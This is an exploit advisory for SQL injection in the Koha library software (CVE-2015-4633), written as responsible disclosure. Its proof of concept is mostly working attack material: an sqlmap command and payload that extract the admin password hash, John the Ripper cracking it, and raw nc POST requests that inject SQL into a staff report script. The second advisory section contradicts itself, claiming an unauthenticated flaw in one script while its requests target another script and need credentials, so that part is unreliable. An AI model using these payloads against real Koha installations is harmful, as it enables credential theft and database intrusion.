@@ -1,0 +1,222 @@
+# Exploit Title: Koha Open Source ILS - Unauthenticated SQL Injection in OPAC
+# Google Dork:
+# Date: 25/06/2015
+# Exploit Author: Raschin Tavakoli, Bernhard Garn, Peter Aufner and Dimitris Simos - Combinatorial Security Testing Group of SBA Research (cst@sba-research.org)
+# Vendor Homepage: koha-community.org
+# Software Link: https://github.com/Koha-Community/Koha
+# Version: 3.20.x <= 3.20.1, 3.18.x <= 3.18.8, 3.16.x <= 3.16.12
+# Tested on: Debian Linux
+# CVE : CVE-2015-4633
+
+
+
+
+### CVE-2015-4633 ### 
+
+#### Titel: ####
+Unauthenticated SQL Injection in Koha
+
+#### Type of vulnerability: ####
+An Unauthenticated SQL Injection vulnerability in Koha allows attackers to read arbitrary data from the database. 
+
+##### Exploitation vector:
+The url parameter 'number' of the /cgi-bin/koha/opac-tags_subject.pl is vulnerable to SQLI.
+
+##### Attack outcome:
+An attacker can read arbitrary data from the database. If the webserver is misconfigured, read & write access the filesystem may be possible.
+
+#### Impact: ####
+critical
+
+#### Software/Product name: ####
+Koha
+
+#### Affected versions: ####
+* <= Koha 3.20.1
+* <= Koha 3.18.8 
+* <= Koha 3.16.12
+
+#### Fixed in version: ####
+* version 3.20.1 http://koha-community.org/security-release-koha-3-20-1/,
+* version 3.18.8 http://koha-community.org/security-release-koha-3-18-8/, 
+* version 3.16.12 http://koha-community.org/security-release-koha-3-16-12/
+
+#### Vendor: ####
+http://koha-community.org/ (Open Source)
+
+#### CVE number: ####
+CVE-2015-4633
+
+#### Timeline ####
+* `2015-06-18` identification of vulnerability 
+* `2015-06-18` 1st contact to release maintainer, immediate reply
+* `2015-06-23` new release with fixed vulnerabilities
+
+#### Credits: ####
+RGhanad-Tavakoli@sba-research.org
+---
+Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research.
+Contact: cst@sba-research.org
+
+#### References:
+http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412
+http://koha-community.org/security-release-koha-3-20-1/
+http://koha-community.org/security-release-koha-3-18-8/
+http://koha-community.org/security-release-koha-3-16-12/
+
+#### Description: ####
+By manipulating the variable 'number' of the /cgi-bin/koha/opac-tags_subject.pl script the database can be accessed via time-based blind injections. If the webserver is misconfigured, the file-system can be accessed as well.
+
+#### Proof-of-concept: ####
+1. Inspect Koha database schema
+
+   Have a look at how to query the database for superlibrarian users:
+   http://wiki.koha-community.org/wiki/SQL_Reports_Library#Superlibrarians
+
+   So basically we we need to execute some SQL statement like this:
+   sql-shell> select userid, password from borrowers where flags=1 and password is not null order by borrowernumber desc limit 1;
+
+2. Query the database with sqlmap
+
+   So let's fire up sqlmap with the --sql-shell parameter and input the query:
+
+   root@kali:/home/wicked# sqlmap -u http://testbox:9001/cgi-bin/koha/opac-tags_subject.pl?number=10 -p number --technique=T --dbms=MySQL --sql-shell --time-sec=4
+         _
+    ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150513}
+   |_ -| . | |     | .'| . |
+   |___|_  |_|_|_|_|__,|  _|
+         |_|           |_|   http://sqlmap.org
+
+   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+   [*] starting at 09:20:07
+
+   [09:20:07] [INFO] testing connection to the target URL
+   sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+   ---
+   Parameter: number (GET)
+       Type: AND/OR time-based blind
+       Title: MySQL >= 5.1 time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)
+       Payload: number=1 PROCEDURE ANALYSE(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(4000000,MD5(0x4b754a4b))))),1)
+   ---
+   [09:20:09] [INFO] testing MySQL
+   [09:20:09] [INFO] confirming MySQL
+   [09:20:09] [INFO] the back-end DBMS is MySQL
+   web server operating system: Linux Debian
+   web application technology: Apache 2.4.10
+   back-end DBMS: MySQL >= 5.0.0
+   [09:20:09] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+
+   sql-shell> select userid, password from borrowers where flags=1 and password is not null order by borrowernumber desc limit 1;
+   [09:20:25] [INFO] fetching SQL SELECT statement query output: 'select userid, password from borrowers where flags=1 and password is not null order by borrowernumber desc limit 1'
+   [09:20:25] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+   [09:20:25] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                      
+   [09:20:52] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+   admin
+   [09:21:46] [INFO] retrieved: $2a$08$taQ
+   [09:23:33] [ERROR] invalid character detected. retrying..
+   [09:23:33] [WARNING] increasing time delay to 5 seconds 
+   afOgEEhU
+   [09:25:10] [ERROR] invalid character detected. retrying..
+   [09:25:10] [WARNING] increasing time delay to 6 seconds 
+   t/gW
+   [09:26:13] [ERROR] invalid character detected. retrying..
+   [09:26:13] [WARNING] increasing time delay to 7 seconds 
+   TOmqnYe1Y6ZNxCENa
+   [09:29:57] [ERROR] invalid character detected. retrying..
+   [09:29:57] [WARNING] increasing time delay to 8 seconds 
+   2.ONk2eZhnuEw5z9OjjxS
+   [09:35:08] [ERROR] invalid character detected. retrying..
+   [09:35:08] [WARNING] increasing time delay to 9 seconds 
+
+   select userid, password from borrowers where flags=1 and password is not null order by borrowernumber desc limit 1;:    
+   'admin, $2a$08$taQafOgEEhUt/gWTOmqnYe1Y6ZNxCENa2.ONk2eZhnuEw5z9OjjxS'
+
+3. Feed john the ripper and be lucky
+
+   root@kali:/home/wicked# echo "$2a$08$taQafOgEEhUt/gWTOmqnYe1Y6ZNxCENa2.ONk2eZhnuEw5z9OjjxS" > ./admin-pass
+   root@kali:/home/wicked# john ./admin-pass 
+   Loaded 1 password hash (OpenBSD Blowfish [32/64 X2])
+   admin            (?)
+   guesses: 1  time: 0:00:00:10 DONE (Thu Jun 25 09:45:41 2015)  c/s: 260  trying: Smokey - allstate
+   Use the "--show" option to display all of the cracked passwords reliably
+
+   root@kali:/home/wicked# john ./admin-pass --show
+   ?:admin
+
+   1 password hash cracked, 0 left
+
+
+4. Log in with username "admin" and password "admin" ;)
+
+
+
+
+
+
+
+
+
+
+### CVE-2015-xxxx ### 
+
+#### Titel: ####
+Unauthenticated SQL Injection
+
+#### Type of vulnerability: ####
+SQL Injection vulnerabilities in Koha staff client allows attackers to read arbitrary data from the database. 
+
+##### Exploitation vector:
+The url parameter 'number' of the /cgi-bin/koha/opac-tags_subject.pl is vulnerable to SQLI.
+
+##### Attack outcome:
+An attacker can read arbitrary data from the database. If the webserver is misconfigured, read & write access to the filesystem is possible.
+
+#### Impact: ####
+critical
+
+#### Software/Product name: ####
+Koha
+
+#### Affected versions: ####
+* <= Koha 3.20.1
+* <= Koha 3.18.8 
+* <= Koha 3.16.12
+
+#### Fixed in version: ####
+* version 3.20.1 http://koha-community.org/security-release-koha-3-20-1/,
+* version 3.18.8 http://koha-community.org/security-release-koha-3-18-8/, 
+* version 3.16.12 http://koha-community.org/security-release-koha-3-16-12/
+
+#### Vendor: ####
+http://koha-community.org/ (Open Source)
+
+#### CVE number: ####
+CVE-2015-xxxx
+
+#### Timeline ####
+* `2015-06-18` identification of vulnerability 
+* `2015-06-18` 1st contact to release maintainer, immediate reply
+* `2015-06-23` new release with fixed vulnerabilities
+
+#### Credits: ####
+RGhanad-Tavakoli@sba-research.org
+---
+Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research.
+Contact: cst@sba-research.org
+
+#### References:
+http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14426
+http://koha-community.org/security-release-koha-3-20-1/
+http://koha-community.org/security-release-koha-3-18-8/
+http://koha-community.org/security-release-koha-3-16-12/
+
+#### Description: ####
+By manipulating the variable 'number' of the /cgi-bin/koha/opac-tags_subject.pl script the database can be accessed via time-based blind injections. If the webserver is misconfigured, the file-system can be accessed as well.
+
+#### Proof-of-concept: ####
+echo -ne "POST /cgi-bin/koha/reports/borrowers_out.pl HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length: 186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=2,'evil')" | nc testbox 9002
+
+echo -ne "POST /cgi-bin/koha/reports/borrowers_out.pl HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length: 186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=1,'evil')" | nc testbox 9002
+
+
